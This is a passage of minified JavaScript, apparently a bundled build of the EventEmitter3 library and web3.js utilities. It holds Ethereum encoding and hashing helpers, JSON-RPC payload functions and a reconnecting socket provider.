            return l._events[v] ? l._events[v].fn ? l._events[v] = [l._events[v], h] : l._events[v].push(h) : (l._events[v] = h, l._eventsCount++), l
        }

        function s(l, u) {
            --l._eventsCount === 0 ? l._events = new r : delete l._events[u]
        }

        function a() {
            this._events = new r, this._eventsCount = 0
        }
        a.prototype.eventNames = function() {
            var u = [],
                c, d;
            if (this._eventsCount === 0) return u;
            for (d in c = this._events) t.call(c, d) && u.push(n ? d.slice(1) : d);
            return Object.getOwnPropertySymbols ? u.concat(Object.getOwnPropertySymbols(c)) : u
        }, a.prototype.listeners = function(u) {
            var c = n ? n + u : u,
                d = this._events[c];
            if (!d) return [];
            if (d.fn) return [d.fn];
            for (var f = 0, h = d.length, v = new Array(h); f < h; f++) v[f] = d[f].fn;
            return v
        }, a.prototype.listenerCount = function(u) {
            var c = n ? n + u : u,
                d = this._events[c];
            return d ? d.fn ? 1 : d.length : 0
        }, a.prototype.emit = function(u, c, d, f, h, v) {
            var p = n ? n + u : u;
            if (!this._events[p]) return !1;
            var w = this._events[p],
                m = arguments.length,
                g, y;
            if (w.fn) {
                switch (w.once && this.removeListener(u, w.fn, void 0, !0), m) {
                    case 1:
                        return w.fn.call(w.context), !0;
                    case 2:
                        return w.fn.call(w.context, c), !0;
                    case 3:
                        return w.fn.call(w.context, c, d), !0;
                    case 4:
                        return w.fn.call(w.context, c, d, f), !0;
                    case 5:
                        return w.fn.call(w.context, c, d, f, h), !0;
                    case 6:
                        return w.fn.call(w.context, c, d, f, h, v), !0
                }
                for (y = 1, g = new Array(m - 1); y < m; y++) g[y - 1] = arguments[y];
                w.fn.apply(w.context, g)
            } else {
                var x = w.length,
                    E;
                for (y = 0; y < x; y++) switch (w[y].once && this.removeListener(u, w[y].fn, void 0, !0), m) {
                    case 1:
                        w[y].fn.call(w[y].context);
                        break;
                    case 2:
                        w[y].fn.call(w[y].context, c);
                        break;
                    case 3:
                        w[y].fn.call(w[y].context, c, d);
                        break;
                    case 4:
                        w[y].fn.call(w[y].context, c, d, f);
                        break;
                    default:
                        if (!g)
                            for (E = 1, g = new Array(m - 1); E < m; E++) g[E - 1] = arguments[E];
                        w[y].fn.apply(w[y].context, g)
                }
            }
            return !0
        }, a.prototype.on = function(u, c, d) {
            return o(this, u, c, d, !1)
        }, a.prototype.once = function(u, c, d) {
            return o(this, u, c, d, !0)
        }, a.prototype.removeListener = function(u, c, d, f) {
            var h = n ? n + u : u;
            if (!this._events[h]) return this;
            if (!c) return s(this, h), this;
            var v = this._events[h];
            if (v.fn) v.fn === c && (!f || v.once) && (!d || v.context === d) && s(this, h);
            else {
                for (var p = 0, w = [], m = v.length; p < m; p++)(v[p].fn !== c || f && !v[p].once || d && v[p].context !== d) && w.push(v[p]);
                w.length ? this._events[h] = w.length === 1 ? w[0] : w : s(this, h)
            }
            return this
        }, a.prototype.removeAllListeners = function(u) {
            var c;
            return u ? (c = n ? n + u : u, this._events[c] && s(this, c)) : (this._events = new r, this._eventsCount = 0), this
        }, a.prototype.off = a.prototype.removeListener, a.prototype.addListener = a.prototype.on, a.prefixed = n, a.EventEmitter = a, e.exports = a
    })(_E);
    var wN = _E.exports;
    const SE = dd(wN);
    class M0 extends SE {
        constructor() {
            super(...arguments), this.maxListeners = Number.MAX_SAFE_INTEGER
        }
        setMaxListeners(t) {
            return this.maxListeners = t, this
        }
        getMaxListeners() {
            return this.maxListeners
        }
    }
    const bN = ye,
        xN = Hu,
        EN = vE,
        AN = Zt,
        _N = $s,
        SN = qd,
        kN = nN,
        TN = rN,
        IN = zu,
        CN = oN,
        PN = (e, t) => {
            const n = typeof e == "string" && tt(e),
                r = typeof t == "string" && tt(t);
            if (e === t || (e === "earliest" || e === 0) && (t === "earliest" || t === 0)) return 0;
            if (e === "earliest" && t > 0) return -1;
            if (t === "earliest" && e > 0) return 1;
            if (n && r) {
                const s = {
                    [ur.EARLIEST]: 1,
                    [ur.FINALIZED]: 2,
                    [ur.SAFE]: 3,
                    [ur.LATEST]: 4,
                    [ur.PENDING]: 5
                };
                return s[e] < s[t] ? -1 : 1
            }
            if (n && !r || !n && r) throw new pP("Cannot compare blocktag with provided non-blocktag input.");
            const i = BigInt(e),
                o = BigInt(t);
            return i < o ? -1 : i === o ? 0 : 1
        },
        Gr = e => typeof e == "object" && !N(e) && Object.keys(e).length !== 0 && ["input", "data", "from", "gas", "gasPrice", "gasLimit", "address", "jsonInterface", "syncWithContext", "dataInputFill"].some(t => t in e),
        X = N,
        _y = e => typeof e == "object" && !N(e) && !Array.isArray(e) && !(e instanceof y0),
        yi = (e, ...t) => {
            if (!_y(e)) return e;
            const n = Object.assign({}, e);
            for (const r of t)
                for (const i in r) _y(r[i]) ? (n[i] || (n[i] = {}), n[i] = yi(n[i], r[i])) : !N(r[i]) && Object.hasOwnProperty.call(r, i) && (Array.isArray(r[i]) || r[i] instanceof y0 ? n[i] = r[i].slice(0) : n[i] = r[i]);
            return n
        },
        bs = (e, t, n = "0") => typeof e == "string" ? ye(e) ? Uu(e, t, n) : e.padStart(t, n) : (Y.validate(["int"], [e]), Uu(e, t, n)),
        kE = (e, t, n = "0") => {
            if (typeof e == "string" && !ye(e)) return e.padEnd(t, n);
            const r = typeof e == "string" && ye(e) ? e : Ze(e),
                i = r.startsWith("-") ? 3 : 2;
            return Y.validate([r.startsWith("-") ? "int" : "uint"], [e]), r.padEnd(t + i, n)
        },
        TE = kE,
        gl = bs,
        IE = (e, t = 64) => {
            Y.validate(["int"], [e]);
            const n = Ot(e);
            if (n >= 0) return bs(Sr(n), t);
            const r = lo(BigInt(2), BigInt(t * 4));
            if (-n >= r) throw new qx(`value: ${e}, nibbleWidth: ${t}`);
            const o = BigInt(n) + r;
            return bs(Ze(o), t)
        },
        RN = (e, t = 64) => {
            Y.validate(["int"], [e]);
            const n = Ot(e);
            if (n < 0) return n;
            const r = Math.ceil(Math.log(Number(n)) / Math.log(2));
            if (r > t * 4) throw new qx(`value: "${e}", nibbleWidth: "${t}"`);
            if (t * 4 !== r) return n;
            const i = lo(BigInt(2), BigInt(t) * BigInt(4));
            return Ot(BigInt(n) - i)
        },
        {
            parseBaseType: NN
        } = gE,
        cr = e => typeof e == "object" && !N(e) && "number" in e && "bytes" in e,
        BN = (e, t, n = []) => {
            let r = Object.assign({}, e),
                i;
            for (const o of t) {
                if (r.oneOf && i) {
                    const s = i,
                        a = n.find(([l]) => l === s);
                    a && a[0] === i && (r = r.oneOf[a[1]])
                }
                if (!r.properties && !r.items) return;
                r.properties ? r = r.properties[o] : r.items && r.items.properties ? r = r.items.properties[o] : r.items && ws(r.items) ? r = r.items : r.items && Array.isArray(r.items) && (r = r.items[parseInt(o, 10)]), r && o && (i = o)
            }
            return r
        },
        vl = (e, t, n) => {
            try {
                const {
                    baseType: r,
                    baseTypeSize: i
                } = NN(t);
                if (r === "int" || r === "uint") switch (n.number) {
                    case dn.NUMBER:
                        return Number(Li(e));
                    case dn.HEX:
                        return Ze(Li(e));
                    case dn.STR:
                        return Li(e).toString();
                    case dn.BIGINT:
                        return Li(e);
                    default:
                        throw new Ep(`Invalid format: ${String(n.number)}`)
                }
                if (r === "bytes") {
                    let o;
                    switch (i ? typeof e == "string" ? o = bs(e, i * 2) : vi(e) && (o = Tt(new Uint8Array(i - e.length), e)) : o = e, n.bytes) {
                        case Er.HEX:
                            return ue(Zn(o));
                        case Er.UINT8ARRAY:
                            return Zn(o);
                        default:
                            throw new Ep(`Invalid format: ${String(n.bytes)}`)
                    }
                }
                if (r === "string") return String(e)
            } catch {
                return e
            }
            return e
        },
        Sy = ({
            value: e,
            schemaProp: t,
            schema: n,
            object: r,
            key: i,
            dataPath: o,
            format: s,
            oneOfPath: a = []
        }) => {
            var l, u;
            if (Array.isArray(e)) {
                let c = t;
                if ((t == null ? void 0 : t.oneOf) !== void 0 && t.oneOf.forEach((d, f) => {
                        var h, v;
                        !Array.isArray(t == null ? void 0 : t.items) && (typeof e[0] == "object" && ((h = d == null ? void 0 : d.items) === null || h === void 0 ? void 0 : h.type) === "object" || typeof e[0] == "string" && ((v = d == null ? void 0 : d.items) === null || v === void 0 ? void 0 : v.type) !== "object") && (c = d, a.push([i, f]))
                    }), N(c == null ? void 0 : c.items)) return delete r[i], o.pop(), !0;
                if (ws(c.items) && !N(c.items.format)) {
                    for (let d = 0; d < e.length; d += 1) r[i][d] = vl(e[d], (l = c == null ? void 0 : c.items) === null || l === void 0 ? void 0 : l.format, s);
                    return o.pop(), !0
                }
                if (!Array.isArray(c == null ? void 0 : c.items) && ((u = c == null ? void 0 : c.items) === null || u === void 0 ? void 0 : u.type) === "object") {
                    for (const d of e) Yd(d, n, o, s, a);
                    return o.pop(), !0
                }
                if (Array.isArray(c == null ? void 0 : c.items)) {
                    for (let d = 0; d < e.length; d += 1) r[i][d] = vl(e[d], c.items[d].format, s);
                    return o.pop(), !0
                }
            }
            return !1
        },
        Yd = (e, t, n, r, i = []) => {
            var o;
            if (!ws(e) && !Array.isArray(e)) return vl(e, t == null ? void 0 : t.format, r);
            const s = e;
            if (Array.isArray(s) && (t == null ? void 0 : t.type) === "array" && ((o = t == null ? void 0 : t.items) === null || o === void 0 ? void 0 : o.type) === "object") Sy({
                value: s,
                schemaProp: t,
                schema: t,
                object: s,
                key: "",
                dataPath: n,
                format: r,
                oneOfPath: i
            });
            else
                for (const [a, l] of Object.entries(s)) {
                    n.push(a);
                    let u = BN(t, n, i);
                    if (N(u)) {
                        delete s[a], n.pop();
                        continue
                    }
                    if (ws(l)) {
                        Yd(l, t, n, r, i), n.pop();
                        continue
                    }
                    if (!Sy({
                            value: l,
                            schemaProp: u,
                            schema: t,
                            object: s,
                            key: a,
                            dataPath: n,
                            format: r,
                            oneOfPath: i
                        })) {
                        if ((u == null ? void 0 : u.format) === void 0 && (u == null ? void 0 : u.oneOf) !== void 0) {
                            for (const [c, d] of u.oneOf.entries())
                                if ((d == null ? void 0 : d.format) !== void 0) {
                                    u = d;
                                    break
                                }
                        }
                        s[a] = vl(l, u.format, r), n.pop()
                    }
                }
            return s
        },
        D = (e, t, n = At) => {
            let r;
            ws(t) ? r = yi({}, t) : Array.isArray(t) ? r = [...t] : r = t;
            const i = ws(e) ? e : R0(e);
            if (!i.properties && !i.items && !i.format) throw new Ep("Invalid json schema for formatting");
            return Yd(r, i, [], n)
        },
        CE = "0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
        xs = e => {
            let t;
            return typeof e == "bigint" || typeof e == "number" ? t = hs(e.toString()) : Array.isArray(e) ? t = new Uint8Array(e) : typeof e == "string" && !ye(e) ? t = hs(e) : t = Zn(e), ue(bt(Wd(t)))
        },
        Gl = e => {
            let t;
            typeof e == "string" ? e.startsWith("0x") && ye(e) ? t = ke(e) : t = hs(e) : t = e;
            const n = xs(t);
            return n === CE ? void 0 : n
        },
        Yt = e => {
            const t = Gl(e);
            return N(t) ? CE : t
        },
        MN = e => {
            if (Array.isArray(e)) throw new Error("Autodetection of array types is not supported.");
            let t, n;
            if (typeof e == "object" && ("t" in e || "type" in e) && ("v" in e || "value" in e)) t = "t" in e ? e.t : e.type, n = "v" in e ? e.v : e.value, t = t.toLowerCase() === "bigint" ? "int" : t;
            else {
                if (typeof e == "bigint") return ["int", e];
                t = Sr(e, !0), n = Sr(e), !t.startsWith("int") && !t.startsWith("uint") && (t = "bytes")
            }
            return (t.startsWith("int") || t.startsWith("uint")) && typeof n == "string" && !/^(-)?0x/i.test(n) && (n = Li(n)), [t, n]
        },
        ON = e => e.startsWith("int[") ? `int256${e.slice(3)}` : e === "int" ? "int256" : e.startsWith("uint[") ? `uint256'${e.slice(4)}` : e === "uint" ? "uint256" : e,
        Jf = (e, t) => {
            const n = /^(\d+).*$/.exec(e.slice(t));
            return n ? parseInt(n[1], 10) : 0
        },
        ky = e => e.toString(2).length,
        Ty = (e, t) => {
            const n = t.toString();
            if (e === "string") {
                if (typeof t == "string") return Pn(t);
                throw new dP(t)
            }
            if (e === "bool" || e === "boolean") {
                if (typeof t == "boolean") return t ? "01" : "00";
                throw new E0(t)
            }
            if (e === "address") {
                if (!Zt(n)) throw new x0(n);
                return n
            }
            const r = ON(e);
            if (e.startsWith("uint")) {
                const i = Jf(r, 4);
                if (i % 8 || i < 8 || i > 256) throw new fy(n);
                const o = Ot(n);
                if (ky(o) > i) throw new hy(n);
                if (o < BigInt(0)) throw new hP(n);
                return i ? gl(o.toString(16), i / 8 * 2) : o.toString(16)
            }
            if (e.startsWith("int")) {
                const i = Jf(r, 3);
                if (i % 8 || i < 8 || i > 256) throw new fy(e);
                const o = Ot(n);
                if (ky(o) > i) throw new hy(n);
                return o < BigInt(0) ? IE(o.toString(), i / 8 * 2) : i ? gl(o.toString(16), i / 4) : o.toString(16)
            }
            if (r === "bytes") {
                if (n.replace(/^0x/i, "").length % 2 !== 0) throw new es(n);
                return n
            }
            if (e.startsWith("bytes")) {
                if (n.replace(/^0x/i, "").length % 2 !== 0) throw new es(n);
                const i = Jf(e, 5);
                if (!i || i < 1 || i > 64 || i < n.replace(/^0x/i, "").length / 2) throw new es(n);
                return TE(n, i * 2)
            }
            return ""
        },
        PE = e => {
            const [t, n] = MN(e);
            return Array.isArray(n) ? n.map(o => Ty(t, o).replace("0x", "")).join("") : Ty(t, n).replace("0x", "")
        },
        O0 = (...e) => `0x${e.map(PE).join("").toLowerCase()}`,
        LN = (...e) => Gl(O0(...e)),
        FN = (...e) => Yt(O0(...e)),
        DN = e => Gl(`0x${(typeof e=="number"?e.toString():e).padStart(64,"0")}`);

    function jN(e) {
        return Jx(e)
    }
    const yl = e => jN(e),
        HN = e => ue(yl(e));
    var Jd = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };

    function RE(e) {
        return (typeof e == "object" || typeof e == "function") && typeof e.then == "function"
    }

    function NE(e, t, n) {
        return Jd(this, void 0, void 0, function*() {
            let r;
            const i = yield Promise.race([e instanceof Promise ? e : e(), new Promise((o, s) => {
                r = setTimeout(() => n ? s(n) : o(void 0), t)
            })]);
            if (r && clearTimeout(r), i instanceof Error) throw i;
            return i
        })
    }

    function L0(e, t) {
        let n;
        return [new Promise((i, o) => {
            n = setInterval(function s() {
                return Jd(this, void 0, void 0, function*() {
                    try {
                        const a = yield NE(e, t);
                        N(a) || (clearInterval(n), i(a))
                    } catch (a) {
                        clearInterval(n), o(a)
                    }
                }), s
            }(), t)
        }), n]
    }

    function $N(e, t) {
        return Jd(this, void 0, void 0, function*() {
            return L0(e, t)[0]
        })
    }

    function F0(e, t) {
        let n;
        const r = new Promise((i, o) => {
            n = setTimeout(() => {
                o(t)
            }, e)
        });
        return [n, r]
    }

    function BE(e, t) {
        let n;
        const r = new Promise((i, o) => {
            n = setInterval(() => {
                Jd(this, void 0, void 0, function*() {
                    const s = yield e();
                    s && (clearInterval(n), o(s))
                })
            }, t)
        });
        return [n, r]
    }
    const D0 = () => {
            const e = yl(16);
            e[6] = e[6] & 15 | 64, e[8] = e[8] & 63 | 128;
            const t = ue(e);
            return [t.substring(2, 10), t.substring(10, 14), t.substring(14, 18), t.substring(18, 22), t.substring(22, 34)].join("-")
        },
        j0 = e => {
            const t = e.error.code;
            return St.has(t) || t >= -32099 && t <= -32e3
        },
        ei = e => !Array.isArray(e) && !!e && e.jsonrpc === "2.0" && "result" in e && N(e.error) && (typeof e.id == "number" || typeof e.id == "string"),
        ti = e => !Array.isArray(e) && e.jsonrpc === "2.0" && !!e && N(e.result) && "error" in e && (typeof e.id == "number" || typeof e.id == "string"),
        Xd = e => !Array.isArray(e) && !!e && e.jsonrpc === "2.0" && !N(e.params) && !N(e.method),
        ME = e => !Array.isArray(e) && !!e && e.jsonrpc === "2.0" && "id" in e && "result" in e,
        Gu = e => ei(e) || ti(e),
        H0 = e => Array.isArray(e) ? e.every(Gu) : Gu(e),
        wl = e => Array.isArray(e) && e.length > 0 && H0(e);
    let Oc;
    const OE = e => {
            Oc = e
        },
        uo = e => {
            var t, n, r, i;
            return typeof Oc < "u" && (Oc += 1), {
                jsonrpc: (t = e.jsonrpc) !== null && t !== void 0 ? t : "2.0",
                id: (r = (n = e.id) !== null && n !== void 0 ? n : Oc) !== null && r !== void 0 ? r : D0(),
                method: e.method,
                params: (i = e.params) !== null && i !== void 0 ? i : void 0
            }
        },
        $0 = e => e.map(t => uo(t)),
        On = e => Array.isArray(e) && e.length > 0,
        UN = Object.freeze(Object.defineProperty({
            __proto__: null,
            isBatchRequest: On,
            isBatchResponse: wl,
            isResponseRpcError: j0,
            isResponseWithError: ti,
            isResponseWithNotification: Xd,
            isResponseWithResult: ei,
            isSubscriptionResult: ME,
            isValidResponse: H0,
            setRequestIdStart: OE,
            toBatchPayload: $0,
            toPayload: uo,
            validateResponse: Gu
        }, Symbol.toStringTag, {
            value: "Module"
        }));
    var Xf = function(e, t, n, r) {
            function i(o) {
                return o instanceof n ? o : new n(function(s) {
                    s(o)
                })
            }
            return new(n || (n = Promise))(function(o, s) {
                function a(c) {
                    try {
                        u(r.next(c))
                    } catch (d) {
                        s(d)
                    }
                }

                function l(c) {
                    try {
                        u(r.throw(c))
                    } catch (d) {
                        s(d)
                    }
                }

                function u(c) {
                    c.done ? o(c.value) : i(c.value).then(a, l)
                }
                u((r = r.apply(e, t || [])).next())
            })
        },
        LE;
    class Vu {
        constructor({
            timeout: t,
            eagerStart: n,
            timeoutMessage: r
        } = {
            timeout: 0,
            eagerStart: !1,
            timeoutMessage: "DeferredPromise timed out"
        }) {
            this[LE] = "Promise", this._state = "pending", this._promise = new Promise((i, o) => {
                this._resolve = i, this._reject = o
            }), this._timeoutMessage = r, this._timeoutInterval = t, n && this.startTimer()
        }
        get state() {
            return this._state
        }
        then(t, n) {
            return Xf(this, void 0, void 0, function*() {
                return this._promise.then(t, n)
            })
        } catch (t) {
            return Xf(this, void 0, void 0, function*() {
                return this._promise.catch(t)
            })
        } finally(t) {
            return Xf(this, void 0, void 0, function*() {
                return this._promise.finally(t)
            })
        }
        resolve(t) {
            this._resolve(t), this._state = "fulfilled", this._clearTimeout()
        }
        reject(t) {
            this._reject(t), this._state = "rejected", this._clearTimeout()
        }
        startTimer() {
            this._timeoutInterval && this._timeoutInterval > 0 && (this._timeoutId = setTimeout(this._checkTimeout.bind(this), this._timeoutInterval))
        }
        _checkTimeout() {
            this._state === "pending" && this._timeoutId && this.reject(new Fx(this._timeoutMessage))
        }
        _clearTimeout() {
            this._timeoutId && clearTimeout(this._timeoutId)
        }
    }
    LE = Symbol.toStringTag;
    class FE {
        constructor(t, n) {
            this.eventEmitter = t, this.autoReconnect = n, this.chunkTimeout = 1e3 * 15
        }
        clearQueues() {
            typeof this._clearQueues == "function" && this._clearQueues()
        }
        onError(t) {
            this._clearQueues = t
        }
        parseResponse(t) {
            const n = [];
            return t.replace(/\}[\n\r]?\{/g, "}|--|{").replace(/\}\][\n\r]?\[\{/g, "}]|--|[{").replace(/\}[\n\r]?\[\{/g, "}|--|[{").replace(/\}\][\n\r]?\{/g, "}]|--|{").split("|--|").forEach(i => {
                let o = i;
                this.lastChunk && (o = this.lastChunk + o);
                let s;
                try {
                    s = JSON.parse(o)
                } catch {
                    this.lastChunk = o, this.lastChunkTimeout && clearTimeout(this.lastChunkTimeout), this.lastChunkTimeout = setTimeout(() => {
                        this.autoReconnect || (this.clearQueues(), this.eventEmitter.emit("error", new Ud({
                            id: 1,
                            jsonrpc: "2.0",
                            error: {
                                code: 2,
                                message: "Chunk timeout"
                            }
                        })))
                    }, this.chunkTimeout);
                    return
                }
                clearTimeout(this.lastChunkTimeout), this.lastChunk = void 0, s && n.push(s)
            }), n
        }
    }
    var Iy = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    class U0 extends Hl {
        constructor() {
            super(...arguments), this._eventEmitter = new SE, this._chainId = "", this._accounts = []
        }
        _getChainId() {
            var t;
            return Iy(this, void 0, void 0, function*() {
                const n = yield this.request(uo({
                    method: "eth_chainId",
                    params: []
                }));
                return (t = n == null ? void 0 : n.result) !== null && t !== void 0 ? t : ""
            })
        }
        _getAccounts() {
            var t;
            return Iy(this, void 0, void 0, function*() {
                const n = yield this.request(uo({
                    method: "eth_accounts",
                    params: []
                }));
                return (t = n == null ? void 0 : n.result) !== null && t !== void 0 ? t : []
            })
        }
        _onConnect() {
            Promise.all([this._getChainId().then(t => {
                t !== this._chainId && (this._chainId = t, this._eventEmitter.emit("chainChanged", this._chainId))
            }).catch(t => {
                console.error(t)
            }), this._getAccounts().then(t => {
                this._accounts.length === t.length && t.every(n => t.includes(n)) || (this._accounts = t, this._onAccountsChanged())
            }).catch(t => {
                console.error(t)
            })]).then(() => this._eventEmitter.emit("connect", {
                chainId: this._chainId
            })).catch(t => {
                console.error(t)
            })
        }
        _onDisconnect(t, n) {
            this._eventEmitter.emit("disconnect", new gP(t, n))
        }
        _onAccountsChanged() {
            this._eventEmitter.emit("accountsChanged", this._accounts)
        }
    }
    var eh = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    const zN = {
            autoReconnect: !0,
            delay: 5e3,
            maxAttempts: 5
        },
        GN = 1e3;
    class DE extends U0 {
        constructor(t, n, r) {
            if (super(), this._connectionStatus = "connecting", this._onMessageHandler = this._onMessage.bind(this), this._onOpenHandler = this._onConnect.bind(this), this._onCloseHandler = this._onCloseEvent.bind(this), this._onErrorHandler = this._onError.bind(this), !this._validateProviderPath(t)) throw new Ap(t);
            this._socketPath = t, this._socketOptions = n, this._reconnectOptions = Object.assign(Object.assign({}, zN), r ?? {}), this._pendingRequestsQueue = new Map, this._sentRequestsQueue = new Map, this._init(), this.connect(), this.chunkResponseParser = new FE(this._eventEmitter, this._reconnectOptions.autoReconnect), this.chunkResponseParser.onError(() => {
                this._clearQueues()
            }), this.isReconnecting = !1
        }
        get SocketConnection() {
            return this._socketConnection
        }
        _init() {
            this._reconnectAttempts = 0
        }
        connect() {
            try {
                this._openSocketConnection(), this._connectionStatus = "connecting", this._addSocketListeners()
            } catch (t) {
                if (this.isReconnecting) setImmediate(() => {
                    this._reconnect()
                });
                else throw this._connectionStatus = "disconnected", t && t.message ? new $l(`Error while connecting to ${this._socketPath}. Reason: ${t.message}`) : new Ap(this._socketPath)
            }
        }
        _validateProviderPath(t) {
            return !!t
        }
        getPendingRequestQueueSize() {
            return this._pendingRequestsQueue.size
        }
        getSentRequestsQueueSize() {
            return this._sentRequestsQueue.size
        }
        supportsSubscriptions() {
            return !0
        }
        on(t, n) {
            this._eventEmitter.on(t, n)
        }
        once(t, n) {
            this._eventEmitter.once(t, n)
        }
        removeListener(t, n) {
            this._eventEmitter.removeListener(t, n)
        }
        _onDisconnect(t, n) {
            this._connectionStatus = "disconnected", super._onDisconnect(t, n)
        }
        disconnect(t, n) {
            const r = t ?? GN;
            this._removeSocketListeners(), this.getStatus() !== "disconnected" && this._closeSocketConnection(r, n), this._onDisconnect(r, n)
        }
        safeDisconnect(t, n, r = !1, i = 1e3) {
            return eh(this, void 0, void 0, function*() {
                let o = 0;
                yield eh(this, void 0, void 0, function*() {
                    return new Promise(a => {
                        const l = setInterval(() => {
                            r && o >= 5 && this.clearQueues(), this.getPendingRequestQueueSize() === 0 && this.getSentRequestsQueueSize() === 0 && (clearInterval(l), a(!0)), o += 1
                        }, i)
                    })
                }), this.disconnect(t, n)
            })
        }
        removeAllListeners(t) {
            this._eventEmitter.removeAllListeners(t)
        }
        _onError(t) {
            this.isReconnecting ? this._reconnect() : this._eventEmitter.emit("error", t)
        }
        reset() {
            this._sentRequestsQueue.clear(), this._pendingRequestsQueue.clear(), this._init(), this._removeSocketListeners(), this._addSocketListeners()
        }
        _reconnect() {
            this.isReconnecting || (this.isReconnecting = !0, this._sentRequestsQueue.size > 0 && this._sentRequestsQueue.forEach((t, n) => {
                t.deferredPromise.reject(new R4), this._sentRequestsQueue.delete(n)
            }), this._reconnectAttempts < this._reconnectOptions.maxAttempts ? (this._reconnectAttempts += 1, setTimeout(() => {
                this._removeSocketListeners(), this.connect(), this.isReconnecting = !1
            }, this._reconnectOptions.delay)) : (this.isReconnecting = !1, this._clearQueues(), this._removeSocketListeners(), this._eventEmitter.emit("error", new P4(this._reconnectOptions.maxAttempts))))
        }
        request(t) {
            return eh(this, void 0, void 0, function*() {
                if (X(this._socketConnection)) throw new Error("Connection is undefined");
                this.getStatus() === "disconnected" && this.connect();
                const n = On(t) ? t[0].id : t.id;
                if (!n) throw new D4("Request Id not defined");
                if (this._sentRequestsQueue.has(n)) throw new N4(n);
                const r = new Vu;
                r.catch(o => {
                    this._eventEmitter.emit("error", o)
                });
                const i = {
                    payload: t,
                    deferredPromise: r
                };
                if (this.getStatus() === "connecting") return this._pendingRequestsQueue.set(n, i), i.deferredPromise;
                this._sentRequestsQueue.set(n, i);
                try {
                    this._sendToSocket(i.payload)
                } catch (o) {
                    this._sentRequestsQueue.delete(n), this._eventEmitter.emit("error", o)
                }
                return r
            })
        }
        _onConnect() {
            this._connectionStatus = "connected", this._reconnectAttempts = 0, super._onConnect(), this._sendPendingRequests()
        }
        _sendPendingRequests() {
            for (const [t, n] of this._pendingRequestsQueue.entries()) try {
                this._sendToSocket(n.payload), this._pendingRequestsQueue.delete(t), this._sentRequestsQueue.set(t, n)
            } catch (r) {
                this._pendingRequestsQueue.delete(t), this._eventEmitter.emit("error", r)
            }
        }
        _onMessage(t) {
            const n = this._parseResponses(t);
            if (!(X(n) || n.length === 0))
                for (const r of n) {
                    if (Xd(r) && r.method.endsWith("_subscription")) {
                        this._eventEmitter.emit("message", r);
                        return
                    }
                    const i = wl(r) ? r[0].id : r.id,
                        o = this._sentRequestsQueue.get(i);
                    if (!o) return;
                    (wl(r) || ei(r) || ti(r)) && (this._eventEmitter.emit("message", r), o.deferredPromise.resolve(r)), this._sentRequestsQueue.delete(i)
                }
        }
        clearQueues(t) {
            this._clearQueues(t)
        }
        _clearQueues(t) {
            this._pendingRequestsQueue.size > 0 && this._pendingRequestsQueue.forEach((n, r) => {
                n.deferredPromise.reject(new xp(t)), this._pendingRequestsQueue.delete(r)
            }), this._sentRequestsQueue.size > 0 && this._sentRequestsQueue.forEach((n, r) => {
                n.deferredPromise.reject(new xp(t)), this._sentRequestsQueue.delete(r)
            }), this._removeSocketListeners()
        }
    }
    const jE = Object.freeze(Object.defineProperty({
        __proto__: null,
        ChunkResponseParser: FE,
        Eip1193Provider: U0,
        EventEmitter: M0,
        SocketProvider: DE,
        Web3DeferredPromise: Vu,
        asciiToHex: xE,
        bytesToHex: ue,
        bytesToUint8Array: Zn,
        checkAddressCheckSum: EN,
        compareBlockNumbers: PN,
        convert: Yd,
        convertScalarValue: vl,
        encodePacked: O0,
        ethUnitMap: Kd,
        format: D,
        fromAscii: mN,
        fromDecimal: uN,
        fromTwosComplement: RN,
        fromUtf8: bE,
        fromWei: vN,
        getStorageSlotNumForLongString: DN,
        hexToAscii: EE,
        hexToBytes: ke,
        hexToNumber: zl,
        hexToNumberString: dN,
        hexToString: pN,
        hexToUtf8: Zd,
        isAddress: AN,
        isBatchRequest: On,
        isBatchResponse: wl,
        isBloom: _N,
        isContractAddressInBloom: TN,
        isContractInitOptions: Gr,
        isDataFormat: cr,
        isHex: xN,
        isHexStrict: bN,
        isInBloom: SN,
        isNullish: X,
        isPromise: RE,
        isResponseRpcError: j0,
        isResponseWithError: ti,
        isResponseWithNotification: Xd,
        isResponseWithResult: ei,
        isSubscriptionResult: ME,
        isTopic: IN,
        isTopicInBloom: CN,
        isUint8Array: vi,
        isUserEthereumAddressInBloom: kN,
        isValidResponse: H0,
        jsonRpc: UN,
        keccak256: xs,
        keccak256Wrapper: xs,
        leftPad: gl,
        mergeDeep: yi,
        numberToHex: Ze,
        padLeft: bs,
        padRight: kE,
        pollTillDefined: $N,
        pollTillDefinedAndReturnIntervalId: L0,
        processSolidityEncodePackedArgs: PE,
        randomBytes: yl,
        randomHex: HN,
        rejectIfConditionAtInterval: BE,
        rejectIfTimeout: F0,
        rightPad: TE,
        setRequestIdStart: OE,
        sha3: Gl,
        sha3Raw: Yt,
        soliditySha3: LN,
        soliditySha3Raw: FN,
        stringToHex: fN,
        toAscii: gN,
        toBatchPayload: $0,
        toBigInt: Li,
        toBool: AE,
        toChecksumAddress: Xn,
        toDecimal: cN,
        toHex: Sr,
        toNumber: Ot,
        toPayload: uo,
        toTwosComplement: IE,
        toUtf8: hN,
        toWei: yN,
        uint8ArrayConcat: Tt,
        uint8ArrayEquals: Qd,
        utf8ToBytes: B0,
        utf8ToHex: Pn,
        uuidV4: D0,
        validateResponse: Gu,
